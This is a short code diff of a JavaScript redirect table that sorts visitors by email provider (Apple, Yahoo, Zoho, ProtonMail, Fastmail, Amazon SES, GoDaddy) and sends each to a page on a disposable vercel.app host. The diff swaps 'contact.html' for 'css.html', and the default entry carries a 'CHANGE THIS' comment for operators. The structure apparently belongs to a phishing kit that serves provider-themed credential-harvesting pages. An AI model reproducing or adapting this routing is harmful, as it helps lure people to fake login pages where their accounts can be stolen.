@@ -43,7 +43,7 @@ const REDIRECT_RULES = {
     },
     'apple': {
         keywords: ['icloud.com', 'apple.com'],
-        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'
+        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/css.html'
     },
     'yahoo': {
         keywords: ['yahoo.com', 'yahoodns.net'],
@@ -51,26 +51,26 @@ const REDIRECT_RULES = {
     },
     'zoho': {
         keywords: ['zoho.com', 'zohomail.com'],
-        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'
+        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/css.html'
     },
     'protonmail': {
         keywords: ['protonmail.com', 'protonmail.ch', 'proton.me'],
-        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'
+        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/css.html'
     },
     'fastmail': {
         keywords: ['fastmail.com', 'fastmail.fm'],
-        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'
+        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/css.html'
     },
     'amazon': {
         keywords: ['amazonaws.com', 'ses.amazonaws.com'],
-        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'
+        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/css.html'
     },
     'godaddy': {
         keywords: ['secureserver.net', 'godaddy.com'],
         url: 'https://sbhlnx-pwu0c-de05.vercel.app/en/main.html'
     },
     'default': {
-        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'  // CHANGE THIS
+        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/css.html'  // CHANGE THIS
     }
 };
 
